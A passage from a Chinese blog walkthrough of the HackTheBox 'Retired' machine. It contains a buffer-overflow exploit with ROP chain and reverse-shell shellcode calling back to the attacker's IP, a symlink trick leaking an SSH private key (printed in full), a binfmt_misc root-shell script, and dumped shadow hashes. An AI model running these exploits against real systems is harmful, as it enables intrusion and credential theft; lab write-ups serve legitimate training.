class="line">inip = input(<span class="string">"\n[\033[1;34m*\033[1;37m] Introduce tu ip (tun0): "</span>)</span><br><span class="line">inport = (<span class="string">"443"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">file</span><span class="params">(path)</span>:</span></span><br><span class="line">    request = requests.get(<span class="string">f"http://10.10.11.154/index.php?page=<span class="subst">&#123;path&#125;</span>"</span>, allow_redirects=<span class="keyword">False</span>)</span><br><span class="line">    rpath = <span class="string">f"/tmp/<span class="subst">&#123;path.split(<span class="string">'/'</span>)[<span class="number">-1</span>]&#125;</span>"</span></span><br><span class="line">    <span class="keyword">with</span> open(rpath,<span class="string">"wb"</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(request.content)</span><br><span class="line">    <span class="keyword">return</span> rpath</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rpid</span><span class="params">()</span>:</span></span><br><span class="line">    request = requests.get(<span class="string">f"http://10.10.11.154/index.php?page=/proc/sched_debug"</span>, allow_redirects=<span class="keyword">False</span>)</span><br><span class="line">    pid = re.search(<span class="string">"activate_licens\s+([0-9]+)"</span>,request.text).group(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">return</span> pid</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">adrs</span><span class="params">(pid)</span>:</span></span><br><span class="line">    r = requests.get(<span class="string">f"http://10.10.11.154/index.php?page=/proc/<span class="subst">&#123;pid&#125;</span>/maps"</span>, allow_redirects=<span class="keyword">False</span>)</span><br><span class="line">    libcb = int(re.search(<span class="string">"^.*libc.*$"</span>, r.text, re.M).group(<span class="number">0</span>).split(<span class="string">"-"</span>)[<span class="number">0</span>], <span class="number">16</span>)</span><br><span class="line">    libcp = re.search(<span class="string">"^.*libc.*$"</span>, r.text, re.M).group(<span class="number">0</span>).split(<span class="string">" "</span>)[<span class="number">-1</span>]</span><br><span class="line">    libsb = int(re.search(<span class="string">"^.*libsqlite.*$"</span>, r.text, re.M).group(<span class="number">0</span>).split(<span class="string">"-"</span>)[<span class="number">0</span>], <span class="number">16</span>)</span><br><span class="line">    libsp = re.search(<span class="string">"^.*libsqlite.*$"</span>, r.text, re.M).group(<span class="number">0</span>).split(<span class="string">" "</span>)[<span class="number">-1</span>]</span><br><span class="line">    sbase = int(re.search(<span class="string">"^.*\[stack\].*$"</span>, r.text, re.M).group(<span class="number">0</span>).split(<span class="string">"-"</span>)[<span class="number">0</span>], <span class="number">16</span>)</span><br><span class="line">    ssend = int(re.search(<span class="string">"^.*\[stack\].*$"</span>, r.text, re.M).group(<span class="number">0</span>).split(<span class="string">"-"</span>)[<span class="number">1</span>].split()[<span class="number">0</span>], <span class="number">16</span>)</span><br><span class="line">    <span class="keyword">return</span> libcb, libcp,libsb, libsp, sbase, ssend</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bof</span><span class="params">()</span>:</span></span><br><span class="line">    ip = socket.inet_aton(inip)</span><br><span class="line">    port =  port=struct.pack(<span class="string">"&gt;H"</span>,int(inport))</span><br><span class="line"></span><br><span class="line">    payload =  <span class="string">b""</span></span><br><span class="line">    payload += <span class="string">b"\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05\x48"</span></span><br><span class="line">    payload += <span class="string">b"\x97\x48\xb9\x02\x00"</span>   + port  +  ip +   <span class="string">b"\x51\x48"</span></span><br><span class="line">    payload += <span class="string">b"\x89\xe6\x6a\x10\x5a\x6a\x2a\x58\x0f\x05\x6a\x03\x5e"</span></span><br><span class="line">    payload += <span class="string">b"\x48\xff\xce\x6a\x21\x58\x0f\x05\x75\xf6\x6a\x3b\x58"</span></span><br><span class="line">    payload += <span class="string">b"\x99\x48\xbb\x2f\x62\x69\x6e\x2f\x73\x68\x00\x53\x48"</span></span><br><span class="line">    payload += <span class="string">b"\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05"</span></span><br><span class="line"></span><br><span class="line">    pid = rpid()</span><br><span class="line"></span><br><span class="line">    libcb, libcp, libsb, libsp, sbase, ssend = adrs(pid)</span><br><span class="line"></span><br><span class="line">    ssize = ssend - sbase</span><br><span class="line"></span><br><span class="line">    context.clear(arch=<span class="string">'amd64'</span>)</span><br><span class="line">    libc = ELF(file(libcp),checksec=<span class="keyword">False</span>)</span><br><span class="line">    libc.address = libcb</span><br><span class="line">    libsql = ELF(file(libsp),checksec=<span class="keyword">False</span>)</span><br><span class="line">    libsql.address = libsb</span><br><span class="line">    rop = ROP([libc, libsql])</span><br><span class="line"></span><br><span class="line">    offset = <span class="number">520</span></span><br><span class="line"></span><br><span class="line">    prt = libc.symbols[<span class="string">'mprotect'</span>]</span><br><span class="line">    rdi = rop.rdi[<span class="number">0</span>]</span><br><span class="line">    rsi = rop.rsi[<span class="number">0</span>]</span><br><span class="line">    rdx = rop.rdx[<span class="number">0</span>]</span><br><span class="line">    rsp = rop.jmp_rsp[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">    exploit = <span class="string">b'A'</span> * offset</span><br><span class="line"></span><br><span class="line">    exploit += p64(rdi) + p64(sbase)</span><br><span class="line">    exploit += p64(rsi) + p64(ssize)</span><br><span class="line">    exploit += p64(rdx) + p64(<span class="number">7</span>)</span><br><span class="line">    exploit += p64(prt)</span><br><span class="line">    exploit += p64(rsp)</span><br><span class="line">    exploit += payload</span><br><span class="line"></span><br><span class="line">    requests.post(<span class="string">f"http://10.10.11.154/activate_license.php"</span>, files = &#123; <span class="string">"licensefile"</span>: exploit &#125; )</span><br><span class="line"></span><br><span class="line">threading.Thread(target=bof, args=()).start()</span><br><span class="line">shell = listen(<span class="number">443</span>, timeout=<span class="number">60</span>).wait_for_connection()</span><br><span class="line">shell.sendline(<span class="string">b"export TERM=xterm HOME=/var/www"</span>)</span><br><span class="line">shell.interactive()</span><br></pre></td></tr></table></figure>

<h1 id="website-backup"><a href="#website-backup" class="headerlink" title="website_backup"></a>website_backup</h1><p>枚举可以发现一个website_backup定时运行,其中调用的是/usr/bin/webbackup：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">systemctl list-timers</span><br><span class="line"></span><br><span class="line">Thu 2022-06-23 05:24:00 UTC 31s left      Thu 2022-06-23 05:23:09 UTC 19s ago              website_backup.timer         website_backup.service</span><br><span class="line"></span><br><span class="line"><span class="meta">$</span><span class="bash"> find / -name website_backup.service 2&gt;/dev/null</span></span><br><span class="line">/etc/systemd/system/website_backup.service</span><br><span class="line"></span><br><span class="line"><span class="meta">$</span><span class="bash"> cat /etc/systemd/system/website_backup.service</span></span><br><span class="line">[Unit]</span><br><span class="line">Description=Backup and rotate website</span><br><span class="line"></span><br><span class="line">[Service]</span><br><span class="line">User=dev</span><br><span class="line">Group=www-data</span><br><span class="line">ExecStart=/usr/bin/webbackup</span><br><span class="line"></span><br><span class="line">[Install]</span><br><span class="line">WantedBy=multi-user.target</span><br></pre></td></tr></table></figure>

<h2 id="usr-bin-webbackup"><a href="#usr-bin-webbackup" class="headerlink" title="/usr/bin/webbackup"></a>/usr/bin/webbackup</h2><p>继续检查这个，发现其中调用zip，我们可以考虑使用软链接让它压缩我们想要获取的文件：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> cat /usr/bin/webbackup</span></span><br><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line">set -euf -o pipefail</span><br><span class="line"></span><br><span class="line">cd /var/www/</span><br><span class="line"></span><br><span class="line">SRC=/var/www/html</span><br><span class="line">DST="/var/www/$(date +%Y-%m-%d_%H-%M-%S)-html.zip"</span><br><span class="line"></span><br><span class="line">/usr/bin/rm --force -- "$DST"</span><br><span class="line">/usr/bin/zip --recurse-paths "$DST" "$SRC"</span><br><span class="line"></span><br><span class="line">KEEP=10</span><br><span class="line">/usr/bin/find /var/www/ -maxdepth 1 -name '*.zip' -print0 \</span><br><span class="line">    | sort --zero-terminated --numeric-sort --reverse \</span><br><span class="line">    | while IFS= read -r -d '' backup; do</span><br><span class="line">        if [ "$KEEP" -le 0 ]; then</span><br><span class="line">            /usr/bin/rm --force -- "$backup"</span><br><span class="line">        fi</span><br><span class="line">        KEEP="$((KEEP-1))"</span><br><span class="line">    done</span><br></pre></td></tr></table></figure>

<h2 id="软链接"><a href="#软链接" class="headerlink" title="软链接"></a>软链接</h2><p>所以就是创建一个软链接，等待执行后去解压生成的zip文件，获取对应文件</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> <span class="built_in">cd</span> /var/www/html</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> ln -s /home/dev/.ssh/id_rsa id_rsa</span></span><br><span class="line"></span><br><span class="line"><span class="meta">$</span><span class="bash"> cp /var/www/2022-06-23_05-50-09-html.zip /tmp</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> <span class="built_in">cd</span> /tmp</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> unzip 2022-06-23_05-50-09-html.zip</span></span><br><span class="line"></span><br><span class="line"><span class="meta">$</span><span class="bash"> cat var/www/html/id_rsa</span></span><br></pre></td></tr></table></figure>

<h2 id="dev-id-rsa"><a href="#dev-id-rsa" class="headerlink" title="dev_id_rsa"></a>dev_id_rsa</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">-----BEGIN OPENSSH PRIVATE KEY-----</span><br><span class="line">b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn</span><br><span class="line">NhAAAAAwEAAQAAAYEA58qqrW05&#x2F;urHKCqCgcIPhGka60Y+nQcngHS6IvG44gcb3w0HN&#x2F;yf</span><br><span class="line">db6Nzw5wfLeLD4uDt8k9M7RPgkdnIRwdNFxleNHuHWmK0j7OOQ0rUsrs8LudOdkHGu0qQr</span><br><span class="line">AnCIpK3Gb74zh6pe03zHVcZyLR2tXWmoXqRF8gE2hsry&#x2F;AECZRSfaYRhac6lASRZD74bQb</span><br><span class="line">xOeSuNyMfCsbJ&#x2F;xKvlupiMKcbD+7RHysCSM6xkgBoJ+rraSpYTiXs&#x2F;vihkp6pN2jMRa&#x2F;ee</span><br><span class="line">ADRNWoyqU7LVsKwhZ&#x2F;&#x2F;AxKjJSvDSnaUeIDaKZ6e4XYsOKTXX3Trh7u9Bjv2YFD8DRDEmDI</span><br><span class="line">5d+t6Imws8370a&#x2F;5Z2z7C7jfCpzDATek0NIqLi3jEmI&#x2F;8vLO9xIckjaNVoqw&#x2F;BVKNqjd03</span><br><span class="line">KKK2Y0c5DRArFmwkJdmbGxwzyTV8oQZdjw0mVBFjbdQ0iiQBEFGNP9&#x2F;zpT&#x2F;&#x2F;ewaosZYROE</span><br><span class="line">4FHXNEIq23Z3SxUNyUeLqkI8Mlf0McBmvc&#x2F;ozGR5AAAFgKXd9Tyl3fU8AAAAB3NzaC1yc2</span><br><span class="line">EAAAGBAOfKqq1tOf7qxygqgoHCD4RpGutGPp0HJ4B0uiLxuOIHG98NBzf8n3W+jc8OcHy3</span><br><span class="line">iw+Lg7fJPTO0T4JHZyEcHTRcZXjR7h1pitI+zjkNK1LK7PC7nTnZBxrtKkKwJwiKStxm++</span><br><span class="line">M4eqXtN8x1XGci0drV1pqF6kRfIBNobK8vwBAmUUn2mEYWnOpQEkWQ++G0G8TnkrjcjHwr</span><br><span class="line">Gyf8Sr5bqYjCnGw&#x2F;u0R8rAkjOsZIAaCfq62kqWE4l7P74oZKeqTdozEWv3ngA0TVqMqlOy</span><br><span class="line">1bCsIWf&#x2F;wMSoyUrw0p2lHiA2imenuF2LDik119064e7vQY79mBQ&#x2F;A0QxJgyOXfreiJsLPN</span><br><span class="line">+9Gv+Wds+wu43wqcwwE3pNDSKi4t4xJiP&#x2F;LyzvcSHJI2jVaKsPwVSjao3dNyiitmNHOQ0Q</span><br><span class="line">KxZsJCXZmxscM8k1fKEGXY8NJlQRY23UNIokARBRjT&#x2F;f86U&#x2F;&#x2F;3sGqLGWEThOBR1zRCKtt2</span><br><span class="line">d0sVDclHi6pCPDJX9DHAZr3P6MxkeQAAAAMBAAEAAAGAEOqioDubgvZBiLXphmzSUxiUpV</span><br><span class="line">0gDrfJ8z8RoqE&#x2F;nAdmylWaFET0olRA5z6niQKgPIczGsOuGsrrDpgFd84kd4DSywmPNkhQ</span><br><span class="line">oF2DEXjbk5RJzJv0spcbRKTQc8OFZcMqCYHemkux79ArRVm&#x2F;X6uT40O+ANMLMOg8YA47+G</span><br><span class="line">EkxEj3n81Geb8GvrcPTlJxf5x0dl9sPt+hxSIkPjvUfKYV7mw9nEzebvYmXBhdHsF8lOty</span><br><span class="line">TR76WaUWtUUJ2EExSD0Am3DQMq4sgLT9tb+rlU7DoHtoSPX6CfdInH9ciRnLG1kVbDaEaa</span><br><span class="line">NT2anONVOswKJWVYgUN83cCCPyRzQJLPC6u7uSdhXU9sGuN34m5wQYp3wFiRnIdKgTcnI8</span><br><span class="line">IoVRX0rnTtBUWeiduhdi2XbYh5OFFjh77tWCi9eTR7wopwUGR0u5sbDZYGPlOWNk22+Ncw</span><br><span class="line">qQMIq0f4TBegkOUNV85gyEkIwifjgvfdw5FJ4zhoVbbevgo7IVz3gIYfDjktTF+n9dAAAA</span><br><span class="line">wDyIzLbm4JWNgNhrc7Ey8wnDEUAQFrtdWMS&#x2F;UyZY8lpwj0uVw8wdXiV8rFFPZezpyio9nr</span><br><span class="line">xybImQU+QgCBdqQSavk4OJetk29fk7X7TWmKw5dwLuEDbJZo8X&#x2F;MozmhgOR9nhMrBXR2g&#x2F;</span><br><span class="line">yJuCfKA0rcKby+3TSbl&#x2F;uCk8hIPUDT+BNYyR5yBggI7+DKQBvHa8eTdvqGRnJ9jUnP6tfB</span><br><span class="line">KCKW97HIfCpt5tzoKiJ7&#x2F;eAuGEjjHN28GP1u4iVoD0udnUHQAAAMEA+RceJG5scCzciPd9</span><br><span class="line">7zsHHTpQNhKQs13qfgQ9UGbyCit+eWzc&#x2F;bplfm5ljfw+cFntZULdkhiFCIosHPLxmYe8r0</span><br><span class="line">FZUzTqOeDCVK9AZjn8uy8VaFCWb4jvB+oZ3d+pjFKXIVWpl0ulnpOOoHHIoM7ghudXb0vF</span><br><span class="line">L8+QpuPCuHrb2N9JVLxHrTyZh3+v9Pg&#x2F;R6Za5RCCT36R+W6es8Exoc9itANuoLudiUtZif</span><br><span class="line">84JIKNaGGi6HGdAqHaxBmEn7N&#x2F;XDu7AAAAwQDuOLR38jHklS+pmYsXyLjOSPUlZI7EAGlC</span><br><span class="line">xW5PH&#x2F;X1MNBfBDyB+7qjFFx0tTsfVRboJvhiYtRbg&#x2F;NgfBpnNH8LpswL0agdZyGw3Np4w8</span><br><span class="line">aQSXt9vNnIW2hDwX9fIFGKaz58FYweCXzLwgRVGBfnpq2QSXB0iXtLCNkWbAS9DM3esjsA</span><br><span class="line">1JCCYKFMrvXeeshyxnKmXix+3qeoh8TTQvr7ZathE5BQrYXvfRwZJQcgh8yv71pNT3Gpia</span><br><span class="line">7rTyG3wbNka1sAAAALZGV2QHJldGlyZWQ&#x3D;</span><br><span class="line">-----END OPENSSH PRIVATE KEY-----</span><br></pre></td></tr></table></figure>

<h1 id="user-flag"><a href="#user-flag" class="headerlink" title="user flag"></a>user flag</h1><p>使用得到的私钥登录dev用户：</p>
<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022062310.jpg" alt="" title="">
                </div>
                <div class="image-caption"></div>
            </figure>

<h1 id="emuemu"><a href="#emuemu" class="headerlink" title="emuemu"></a>emuemu</h1><p>emuemu目录里两个二进制文件，提供有源码：</p>
<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022062311.jpg" alt="" title="">
                </div>
                <div class="image-caption"></div>
            </figure>

<p>reg_helper发现binfmt_misc相关：</p>
<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022062312.jpg" alt="" title="">
                </div>
                <div class="image-caption"></div>
            </figure>

<p>搜索可以发现实际使用的lib目录下的reg_helper,和当前目录的一致：</p>
<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022062313.jpg" alt="" title="">
                </div>
                <div class="image-caption"></div>
            </figure>

<p>也可以发现binfmt_misc相关利用：</p>
<ul>
<li>toffan/binfmt_misc: Kernel Support for miscellaneous (your favourite) exploits<br><a href="https://github.com/toffan/binfmt_misc" target="_blank" rel="noopener">https://github.com/toffan/binfmt_misc</a></li>
</ul>
<h1 id="提权-amp-root-flag"><a href="#提权-amp-root-flag" class="headerlink" title="提权 &amp; root flag"></a>提权 &amp; root flag</h1><p>上面的脚本修改一些代码为当前环境信息，运行，root</p>
<ul>
<li>删除not_writeable因为我们没有对应的写权限</li>
<li>最终的echo那里使用对应文件</li>
</ul>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">echo "$binfmt_line" &gt; "$mountpoint"/register</span><br><span class="line">echo "$binfmt_line" | /usr/lib/emuemu/reg_helper</span><br></pre></td></tr></table></figure>

<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022062314.jpg" alt="" title="">
                </div>
                <div class="image-caption"></div>
            </figure>



<h2 id="exp-sh"><a href="#exp-sh" class="headerlink" title="exp.sh"></a>exp.sh</h2><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">readonly</span> searchsuid=<span class="string">"/bin/"</span></span><br><span class="line"><span class="built_in">readonly</span> mountpoint=<span class="string">"/proc/sys/fs/binfmt_misc"</span></span><br><span class="line"><span class="built_in">readonly</span> exe=<span class="string">"<span class="variable">$0</span>"</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">warn()</span><br><span class="line">&#123;</span><br><span class="line">    1&gt;&amp;2 <span class="built_in">echo</span> <span class="variable">$@</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">die()</span><br><span class="line">&#123;</span><br><span class="line">    warn <span class="variable">$@</span></span><br><span class="line">    <span class="built_in">exit</span> -1</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">usage()</span><br><span class="line">&#123;</span><br><span class="line">    cat 1&gt;&amp;2 &lt;&lt;EOF</span><br><span class="line">Usage: <span class="variable">$exe</span></span><br><span class="line">    Gives you a root shell <span class="keyword">if</span> /proc/sys/fs/binfmt_misc/register is writeable,</span><br><span class="line">    note that it must be enforced by any other mean before your try this, <span class="keyword">for</span></span><br><span class="line">    example by typing something like <span class="string">"sudo chmod +6 /*/*/f*/*/*r"</span> <span class="keyword">while</span> Dave is</span><br><span class="line">    thinking that you are fixing his problem.</span><br><span class="line">EOF</span><br><span class="line">    <span class="built_in">exit</span> 1</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> pick_suid()</span><br><span class="line">&#123;</span><br><span class="line">	find <span class="string">"<span class="variable">$1</span>"</span> -perm -4000 -executable \</span><br><span class="line">	    | tail -n 1</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> read_magic()</span><br><span class="line">&#123;</span><br><span class="line">    [[ -e <span class="string">"<span class="variable">$1</span>"</span> ]] &amp;&amp; \</span><br><span class="line">    [[ <span class="string">"<span class="variable">$2</span>"</span> =~ [[:digit:]]+ ]] &amp;&amp; \</span><br><span class="line">    dd <span class="keyword">if</span>=<span class="string">"<span class="variable">$1</span>"</span> bs=1 count=<span class="string">"<span class="variable">$2</span>"</span> status=none \</span><br><span class="line">        | sed -e <span class="string">'s-\x00-\\x00-g'</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">[[ -n <span class="string">"<span class="variable">$1</span>"</span> ]] &amp;&amp; usage</span><br><span class="line"></span><br><span class="line">target=<span class="string">"<span class="variable">$(pick_suid "$searchsuid")</span>"</span></span><br><span class="line"><span class="built_in">test</span> -e <span class="string">"<span class="variable">$target</span>"</span> || die <span class="string">"Error: Unable to find a suid binary in <span class="variable">$searchsuid</span>"</span></span><br><span class="line"></span><br><span class="line">binfmt_magic=<span class="string">"<span class="variable">$(read_magic "$target" "126")</span>"</span></span><br><span class="line"><span class="built_in">test</span> -z <span class="string">"<span class="variable">$binfmt_magic</span>"</span> &amp;&amp; die <span class="string">"Error: Unable to retrieve a magic for <span class="variable">$target</span>"</span></span><br><span class="line"></span><br><span class="line">fmtname=<span class="string">"<span class="variable">$(mktemp -u XXXX)</span>"</span></span><br><span class="line">fmtinterpr=<span class="string">"<span class="variable">$(mktemp)</span>"</span></span><br><span class="line"></span><br><span class="line">gcc -o <span class="string">"<span class="variable">$fmtinterpr</span>"</span> -xc - &lt;&lt;- __EOF__</span><br><span class="line">	<span class="comment">#include &lt;stdlib.h&gt;</span></span><br><span class="line">	<span class="comment">#include &lt;unistd.h&gt;</span></span><br><span class="line">	<span class="comment">#include &lt;stdio.h&gt;</span></span><br><span class="line">	<span class="comment">#include &lt;pwd.h&gt;</span></span><br><span class="line"></span><br><span class="line">	int main(int argc, char *argv[])</span><br><span class="line">	&#123;</span><br><span class="line">		// remove our temporary file</span><br><span class="line">		unlink(<span class="string">"<span class="variable">$fmtinterpr</span>"</span>);</span><br><span class="line"></span><br><span class="line">		// remove the unused binary format</span><br><span class="line">		FILE* fmt = fopen(<span class="string">"<span class="variable">$mountpoint</span>/<span class="variable">$fmtname</span>"</span>, <span class="string">"w"</span>);</span><br><span class="line">		fprintf(fmt, <span class="string">"-1\\n"</span>);</span><br><span class="line">		fclose(fmt);</span><br><span class="line"></span><br><span class="line">		// MOTD</span><br><span class="line">		setuid(0);</span><br><span class="line">		uid_t uid = getuid();</span><br><span class="line">		uid_t euid = geteuid();</span><br><span class="line">		struct passwd *pw = getpwuid(uid);</span><br><span class="line">		struct passwd *epw = getpwuid(euid);</span><br><span class="line">		fprintf(stderr, <span class="string">"uid=%u(%s) euid=%u(%s)\\n"</span>,</span><br><span class="line">			uid,</span><br><span class="line">			pw-&gt;pw_name,</span><br><span class="line">			euid,</span><br><span class="line">			epw-&gt;pw_name);</span><br><span class="line"></span><br><span class="line">		// welcome home</span><br><span class="line">		char* sh[] = &#123;<span class="string">"/bin/sh"</span>, (char*) 0&#125;;</span><br><span class="line">		execvp(sh[0], sh);</span><br><span class="line">		<span class="built_in">return</span> 1;</span><br><span class="line">	&#125;</span><br><span class="line">__EOF__</span><br><span class="line"></span><br><span class="line">chmod a+x <span class="string">"<span class="variable">$fmtinterpr</span>"</span></span><br><span class="line"></span><br><span class="line">binfmt_line=<span class="string">"_<span class="variable">$&#123;fmtname&#125;</span>_M__<span class="variable">$&#123;binfmt_magic&#125;</span>__<span class="variable">$&#123;fmtinterpr&#125;</span>_OC"</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">"<span class="variable">$binfmt_line</span>"</span> | /usr/lib/emuemu/reg_helper</span><br><span class="line"></span><br><span class="line"><span class="built_in">exec</span> <span class="string">"<span class="variable">$target</span>"</span></span><br></pre></td></tr></table></figure>

<h2 id="shadow"><a href="#shadow" class="headerlink" title="shadow"></a>shadow</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root:$y$j9T$WTPWClbhbDs7l.UxQ36u80$ARJoOe6zhfOEca5WFBXjo4fGaxCg1Iof6qTbrfn1CzA:19062:0:99999:7:::</span><br><span class="line">dev:$6$kxjJ4ZicR62IY8ot$YKNoHWo9jQdRnNQ2f9dKX4IUI70ocRkClcIjUfoI&#x2F;RF0.q6UeWLf2Jb8AfNyBHjJPxS0o5a7MhBR9g.eNfu8&#x2F;.:18913:0:99999:7:::</span><br></pre></td></tr></table></figure>



<h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><ul>
<li>toffan/binfmt_misc: Kernel Support for miscellaneous (your favourite) exploits<br><a href="https://github.com/toffan/binfmt_misc" target="_blank" rel="noopener">https://github.com/toffan/binfmt_misc</a></li>
<li>HTB - Retired (Box) | BreachForums<br><a href="https://breached.to/Thread-HTB-Retired-Box?highlight=Retired" target="_blank" rel="noopener">https://breached.to/Thread-HTB-Retired-Box?highlight=Retired</a></li>
<li>Writeup Retired HackTheBox<br><a href="https://gatogamer1155.github.io/hackthebox/retired/" target="_blank" rel="noopener">https://gatogamer1155.github.io/hackthebox/retired/</a></li>
<li>Autopwns/Retired at main · GatoGamer1155/Autopwns<br><a href="https://github.com/GatoGamer1155/Autopwns/tree/main/Retired" target="_blank" rel="noopener">https://github.com/GatoGamer1155/Autopwns/tree/main/Retired</a></li>
</ul>

        </div>

        <blockquote class="post-copyright">
    
    <div class="content">
        
<span class="post-time">
    最終更新：<time datetime="2022-08-15T04:26:14.592Z" itemprop="dateUpdated">2022-08-15 12:26:14</time>
</span><br>


        
        水平不济整日被虐这也不会那也得学,脑子太蠢天天垫底这看不懂那学不会
        
    </div>
    
    <footer>
        <a href="https://darkwing.moe">
            <img src="/img/avatar.jpg" alt="暗羽">
            暗羽
        </a>
    </footer>
</blockquote>

        
<div class="page-reward">
